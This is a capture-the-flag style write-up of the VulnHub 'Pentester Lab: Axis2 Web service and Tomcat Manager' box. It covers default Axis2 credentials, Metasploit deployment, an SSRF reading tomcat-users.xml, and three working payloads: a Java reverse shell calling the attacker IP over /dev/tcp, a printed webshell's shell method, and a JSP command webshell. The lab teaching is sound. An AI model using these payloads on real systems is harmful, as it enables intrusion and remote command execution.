# Pentester Lab: Axis2 Web service and Tomcat Manager

## Introduction

Welcome to my another writeup! In this VulnHub [Pentester Lab: Axis2 Web service and Tomcat Manager](https://www.vulnhub.com/entry/pentester-lab-axis2-web-service-and-tomcat-manager,72/) box, you'll learn: Content discovery via `gobuster`, deploying malicious Axis2 service with Metasploit and manually, eploiting Axis2 service "ProxyService" SSRF vulnerability, deploying malicious WAR file via Tomcat Web Application Manager, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

 1. [Video Writeup](#video-writeup)  
 2. [Service Enumeration](#service-enumeration)  
 3. [Initial Foothold](#initial-foothold)  
    3.1. [Method 1 - Upload A Malicious Axis2 Service Archive File (Metasploit)](#method-1---upload-a-malicious-axis2-service-archive-file-metasploit)  
    3.2. [Method 2 - Upload A Malicious Axis2 Service Archive File (Manually)](#method-2---upload-a-malicious-axis2-service-archive-file-manually)  
    3.3. [Method 3 - Exploiting Axis2 Service "ProxyService" (Intended Solution)](#method-3---exploiting-axis2-service-proxyservice-intended-solution)  
 4. [Conclusion](#conclusion)  

## Video Writeup

> Coming soon! :D

## Background

- Difficulty: Intermediate

This exercice explains the interactions between Tomcat and Apache, then it will show you how to call and attack an Axis2 Web service. Using information retrieved from this attack, you will be able to gain access to the Tomcat Manager and deploy a WebShell to gain commands execution.

## Service Enumeration

- Attacker machine IP: `192.168.174.130`
- Target machine IP: `192.168.174.129`

**Create a new environment variable for future use:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004136.png)

As usual, scan the machine for open ports via `nmap`!

**Nmap TCP full port scan:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120001824.png)

According to `nmap` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 5.5p1 Debian          |
|80/TCP            | Apache httpd 2.2.16 ((Debian))|

### HTTP on TCP port 80

**Home page**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120002012.png)

In here, we can see that this page is Apache Tomcat 6's default installation page.

**In Apache Tomcat, when we go to an non-existing endpoint, it'll verbosely display its version:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120002724.png)

As we can see, It's using **Apache Tomcat version 6.0.35**.

Next, we can discover hidden directories and files with tools like `gobuster`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120003723.png)

- Found directory: `META-INF`, `/axis2`, `/examples`, `/manager`

Right off the bat, we can see **1 interesting endpoint called `/axis2`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004440.png)

In here we can see Apache Axis2 home page.

> **Apache Axis** (**A**pache e**X**tensible **I**nteraction **S**ystem) is an [open-source](https://en.wikipedia.org/wiki/Open-source_software "Open-source software"), [XML](https://en.wikipedia.org/wiki/XML "XML") based [Web service](https://en.wikipedia.org/wiki/Web_service "Web service") framework. It consists of a [Java](https://en.wikipedia.org/wiki/Java_(programming_language) "Java (programming language)") and a [C++](https://en.wikipedia.org/wiki/C%2B%2B "C++") implementation of the [SOAP](https://en.wikipedia.org/wiki/SOAP_(protocol) "SOAP (protocol)") server, and various utilities and [APIs](https://en.wikipedia.org/wiki/API "API") for generating and deploying [Web](https://en.wikipedia.org/wiki/WWW "WWW") service applications. (from [https://en.wikipedia.org/wiki/Apache_Axis](https://en.wikipedia.org/wiki/Apache_Axis))

**In endpoint `/axis2/services/Version`, we can check this machine's Apache Axis2 version:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004641.png)

- Axis2 version: `1.6.2`

In Axis2, there's a admin console at endpoint `/axis2-admin`. It allows administrators to upload, deploy services, enable/disable modules, and more.

**Admin console:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004847.png)

In the login form, we can try default credentials for Axis2 admin console.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004906.png)

- Axis2 default credentials: `admin:axis2`

Let's login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004921.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120004933.png)

Nice! We're in! The default admin credentials worked!

## Initial Foothold

### Method 1 - Upload A Malicious Axis2 Service Archive File (Metasploit)

**After authenticated on the admin console, we can upload a packaged Axis2 service, which allows us to execute arbitrary code on the machine:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120005155.png)

Let's find some public exploits for Axis2 via offline version of Exploit-DB: `searchsploit`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120005820.png)

As you can see, Axis2 can execute arbitrary code if authenticated.

However, instead doing all the hard work, we can fire up Metasploit to automate that process.

To exploit authenticated Axis2, we can:

- Launch Metasploit console:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120005944.png)

- Search for `axis2` related modules:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120010000.png)

- Choose module `exploit/multi/http/axis2_deployer`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120010013.png)

- Enter necessary parameters and run the module: 

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120010044.png)

- Profit:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120010106.png)

I'm user `tomcat6`!

### Method 2 - Upload A Malicious Axis2 Service Archive File (Manually)

In this method, we can upload and deploy a malicious Axis Service manually without the help of Metasploit.

- Download an AAR webshell from [https://github.com/xl7dev/WebShell/tree/master/Aar](https://github.com/xl7dev/WebShell/tree/master/Aar):

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120024445.png)

- Unzip it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120024534.png)

> Note: You can read the source code of this service in `Utils.java`.

- Upload `config.aar` and deploy the service:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120024709.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120024719.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120024727.png)

**Go to `/axis2/axis2-admin/listService`, you should see service `config`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120025102.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120025108.png)

According to the `README.md` markdown file, the service has 5 operations:
1. Executes OS command: `/exec`, GET parameter `cmd`
2. Reverse shell: `/shell`, GET parameter `host`, `port`
3. File upload: `/upload`, GET parameter `path`
4. File download: `/download`, GET parameter `url`, `path`
5. Get class path: `/getClassPath`

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231217202526.png)

**Now, we should be able to execute OS command on endpoint `/axis2/services/config/exec` with GET parameter `cmd`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231120025315.png)

***However, when you try to use the `shell` module to get a reverse shell session, it doesn't work:***

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212215916.png)

Hmm... We got permission denied...

To figure out why, we should dig through the source code.

If you look at [the source code of the `Utils` class](https://github.com/tennc/webshell/blob/master/other/Axis2Shell/Utils.java), you'll see why this is happening:

```java
ppublic class Utils {
    [...]
    public static String shell(String host, int port) {
        [...]
        if (os.startsWith("linux")) {
                    
            String name="wooyun.sh";
            File file=new File(name);
            
            FileWriter writer=new FileWriter(file);
            writer.write("/bin/bash -i > /dev/tcp/"+host+"/"+port+" 0<&1 2>&1"+"\n");
            writer.flush();
            writer.close();
            Runtime.getRuntime().exec("chmod u+x "+name);
            Process process = Runtime.getRuntime().exec("bash "+name);
            process.waitFor();
            
            file.delete();
        } [...]
    }
    [...]
```

As you can see, the reverse shell payload is being written into the disk, and the filename is `wooyun.sh`. However, **it's written into the current work directory**, which may or may not have enough privilege to write files into that directory.

To solve this problem and get a shell on the target machine, we can deploy our own AAR archive file:

But before we do that, we should check the target machine's JDK (Java) version. To do so, we can go back to endpoint `/axis2/` and view the target's environment variables:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212221310.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212221330.png)

As you can see, **the target machine's JDK version is `1.6.0_18`**.

That being said, let's download JDK version 1.6:

- Download URL: [https://download.oracle.com/otn/java/jdk/6u1/jdk-6u1-linux-amd64.bin?AuthParam=1702433572_6f0df071533ca746baa478a415fda842](https://download.oracle.com/otn/java/jdk/6u1/jdk-6u1-linux-amd64.bin?AuthParam=1702433572_6f0df071533ca746baa478a415fda842)

- Extract the JDK file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212221940.png)

- Accept the license terms by hitting `q` and enter `yes`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212221805.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212221829.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212222015.png)

Now we should be able to use JDK version 1.6 in directory `/etc/jdk1.6.0_01/bin/`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212222041.png)

After installing and extracting JDK version 1.6, we can now deploy our own AAR archive file!

- Create a directory for storing our files:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212213438.png)

- Copy and paste the following Java code to a file called `ReverseShell.java`:

```java
public class ReverseShell {
    // generated from https://www.revshells.com/
    public static void revshell(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.174.130/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

> Note: Remember to change your own IP address and netcat listener port.

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212213601.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213013812.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213013825.png)

- Create a directory called `META-INF`

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212213735.png)

- Inside that directory, copy the following XML code to a file called `services.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<service name="ReverseShell" targetNamespace="http://ws.apache.org/ax2">
    <description>Your lovely Axis2 AAR reverse shell</description>
    <messageReceivers>
        <messageReceiver mep="http://www.w3.org/2004/08/wsdl/in-only" class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver" />
        <messageReceiver  mep="http://www.w3.org/2004/08/wsdl/in-out"  class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
    </messageReceivers>
    <parameter name="ServiceClass">ReverseShell</parameter>
</service>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212213841.png)

- Compile the Java code to a `.class` file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212213927.png)

- Create an AAR archive file for the deployment of our Axis2 service:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214013.png)

- Setup a netcat listener:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214034.png)

- Upload and deploy our AAR archive file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214133.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214141.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214147.png)

- Check is it deployed successfully or not:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212214222.png)

Yes it does!

- Trigger the reverse shell payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212215458.png)

> Note: You can only trigger the payload once. After that, it shouldn't work because the connection didn't get terminated.

- Profit:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212215527.png)

I'm user `tomcat6`!

### Method 3 - Exploiting Axis2 Service "ProxyService" (Intended Solution)

In the target's Axis2, there's a web service called "**ProxyService**":

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212222633.png)

**If we click on the "ProxyService" link, it brings to `/axis2/services/ProxyService?wsdl`, which lists the details of this module:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212223544.png)

According to [Axis2 documentation](https://axis.apache.org/axis2/java/core/docs/axis2config.html#Service_Configuration), element `operations` is a method in the service's Java class. In our case, **it has 1 method called `get`**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212224410.png)

In the `input` element right below the `operation` element, we can see that it has 1 attribute called `wsaw:Action`, and its value is `urn:get`.

**Then, in element `element`, we can see the GET parameter is `uri`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212224851.png)

With that said, **we can use the `get` operation in service "ProxyService" by visiting `/axis2/services/ProxyService/get?uri=<uri_here>`**.

Hmm... Let's setup a simple Python web server via module `http.server`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212225211.png)

Then, try to use the ProxyService's `get` operation to reach to our web server:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212225329.png)

Ah ha! It returned our web server's respond!

Based on my experience, we can try to exploit SSRF (Server-Side Request Forgery) vulnerability and reach to the target's internal network!

**To do so, we can simply change the `uri` GET parameter's value to `http://localhost/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212225542.png)

Nice! We can reach the target's internal network!

**In SSRF, we can also use the `file://` protocol to read the target machine's local file system's files!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212225725.png)

But... What can we even do with SSRF??

Hmm... **Maybe we can read Tomcat's configuration file to get the manager webapp username and password, then deploy our malicious WAR file?**

According to [this blog post](https://blog.techstacks.com/2011/08/tomcat-6-directory-locations-on-ubuntu-server-1104.html), **Tomcat version 6 default webapps directory is at `/var/lib/tomcat6/`**. Then, according to [Tomcat version 6 documentation](https://tomcat.apache.org/tomcat-6.0-doc/realm-howto.html), the accesses authentication information is stored at `conf/tomcat-users.xml`.

That being said, to read the manager webapp username and password, **we can leverage the SSRF vulnerability and read file `/var/lib/tomcat6/conf/tomcat-users.xml`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212230607.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212230626.png)

Nice! We found it!

- Manager webapp username: `manager`
- Manager webapp password: `!mp0ss!bl32gu355`

**Armed with above information, we can go to `/manager/html` to access the manager webapp!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212230756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212230807.png)

**Now we can deploy our malicious WAR file!!**

- Create a directory called `webshell`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010220.png)

- Copy and paste the following JSP webshell code to a file called `index.jsp`:

```java
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"\n"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%><%=output %>
```

> Note: The above webshell is modified from [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#manual-method-web-shell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#manual-method-web-shell).

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010244.png)

- Create a WAR archive file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010357.png)

- Setup a netcat listener:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231212230951.png)

- Upload and deploy the WAR file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010520.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010528.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010538.png)

After that, we should able to see an application on path `/webshell`.

Now we can execute arbitrary OS commands!

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010622.png)

- Send a reverse shell payload to endpoint `/webshell/` with GET parameter `cmd`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010736.png)

- Profit:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Pentester-Lab:Axis2-Web-service-and-Tomcat-Manager/images/Pasted%20image%2020231213010746.png)

I'm user `tomcat6`!

## Conclusion

What we've learned:

1. Content discovery via `gobuster`
2. Deploying malicious Axis2 service with Metasploit and manually
3. Exploiting Axis2 service "ProxyService" SSRF vulnerability
4. Deploying malicious WAR file via Tomcat Web Application Manager